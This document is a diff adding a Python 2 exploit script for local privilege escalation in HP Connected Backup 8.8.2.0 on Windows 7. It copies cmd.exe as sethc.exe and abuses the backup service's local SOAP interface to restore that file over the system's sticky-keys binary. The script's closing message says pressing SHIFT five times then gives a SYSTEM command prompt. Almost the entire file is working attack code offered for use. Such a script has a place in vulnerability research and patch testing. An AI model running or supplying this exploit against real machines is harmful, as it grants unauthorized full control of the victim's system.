@@ -1,0 +1,78 @@
+#Tested on HP Connected Backup version 8.8.2.0 on Windows 7 x64
+
+import os
+import sys
+import time
+import requests
+from bs4 import BeautifulSoup
+
+def send_request(body):
+    url="http://localhost:16386/"
+    headers = {"Content-Type": "text/xml; charset=utf-8", 'SOAPAction': '""', "Set-Cookie": "CCSessionID=SessionID11"}
+    response = requests.post(url, data=body, headers=headers)
+    if response.status_code != requests.codes.ok:
+        print "Non-200 response. Exiting..."
+        sys.exit()
+    else:
+        return response.text
+        
+        
+def get_tdate(response):
+    soup = BeautifulSoup(response, "html.parser")
+    tdate = soup.findAll("m-tdate")[0].string
+    return tdate
+    
+#Copy cmd.exe to world-writeable folder
+print "HP Connected Backup Privilege Escalation by Peter Lapp(lappsec)"
+print "Copying cmd.exe to C:\\hpcb-privesc"
+os.system("mkdir C:\\hpcb-privesc")
+os.system("copy C:\\Windows\\system32\\cmd.exe C:\\hpcb-privesc\\sethc.exe")
+        
+print "Creating backup for C:\\hpcb-privesc\\sethc.exe"
+
+#StartScan required before IncludeFile request will be accepted
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:StartScan xmlns:q1="http://localhost/UIRequestHandler.wsdl" /></soap:Body></soap:Envelope>""")
+
+time.sleep(3)
+
+#Add file to backup
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:IncludeFile xmlns:q1="http://localhost/UIRequestHandler.wsdl"><param-1 xsi:type="xsd:base64Binary">QzpcaHBjYi1wcml2ZXNjXHNldGhjLmV4ZQ==</param-1><param-2 xsi:type="xsd:boolean">true</param-2></q1:IncludeFile></soap:Body></soap:Envelope>""")
+
+
+print "Initiating Backup"
+#Start backup
+
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:Backup xmlns:q1="http://localhost/UIRequestHandler.wsdl" /></soap:Body></soap:Envelope>""")
+
+print """Sleeping for 300 seconds to give time for backup to complete. 
+If the script fails after this then change the sleep period to give the backup enough time to complete"""
+
+time.sleep(300)
+
+print "Initiating restore"
+#PrepareRetrieve requires valid PID of process running as SYSTEM. PID 456 is common for Windows 7 but if it fails, try another
+
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:PrepareForRetrieve xmlns:q1="http://localhost/UIRequestHandler.wsdl"><param-1 xsi:type="xsd:unsignedInt">456</param-1></q1:PrepareForRetrieve></soap:Body></soap:Envelope>""")
+
+#We have to get the m-TDate value for the file in order for the restore to work correctly
+print "Getting m-TDate value"
+fileinfo = send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:GetRestoreDirectoryInfo xmlns:q1="http://localhost/UIRequestHandler.wsdl"><param-1 xsi:type="xsd:base64Binary">QzpcaHBjYi1wcml2ZXNjXA==</param-1></q1:GetRestoreDirectoryInfo></soap:Body></soap:Envelope>""")
+tdate = get_tdate(fileinfo)
+
+print "Adding Restore file"
+
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:AddRestoreFile xmlns:q1="http://localhost/UIRequestHandler.wsdl"><param-1 xsi:type="xsd:base64Binary">QzpcaHBjYi1wcml2ZXNjXHNldGhjLmV4ZQ==</param-1><param-2 xsi:type="xsd:boolean">false</param-2><param-3 xsi:type="xsd:unsignedInt">"""+tdate+"""</param-3></q1:AddRestoreFile></soap:Body></soap:Envelope>""")
+
+
+print "Setting alternate restore path to C:\\Windows\\system32\\"
+
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:SetAlternateRestorePath xmlns:q1="http://localhost/UIRequestHandler.wsdl"><param-1 xsi:type="xsd:string">C:\Windows\system32</param-1><param-2 xsi:type="xsd:boolean">false</param-2></q1:SetAlternateRestorePath></soap:Body></soap:Envelope>""")
+
+
+#Set restore to replace existing file
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:SetReplaceExisting xmlns:q1="http://localhost/UIRequestHandler.wsdl"><param-1 xsi:type="xsd:boolean">true</param-1></q1:SetReplaceExisting></soap:Body></soap:Envelope>""")
+
+print "Restoring C:\\hpcb-privesc\\sethc.exe to C:\\Windows\\system32\\sethc.exe"
+send_request("""<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://localhost//UIRequestHandler.wsdl" xmlns:types="http://localhost//UIRequestHandler.wsdl/encodedTypes" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:Restore xmlns:q1="http://localhost/UIRequestHandler.wsdl" /></soap:Body></soap:Envelope>""")
+
+print "If it made it this far without an error, then you should now be able to log out, press SHIFT 5 times and be given a command prompt as SYSTEM. Enjoy!"
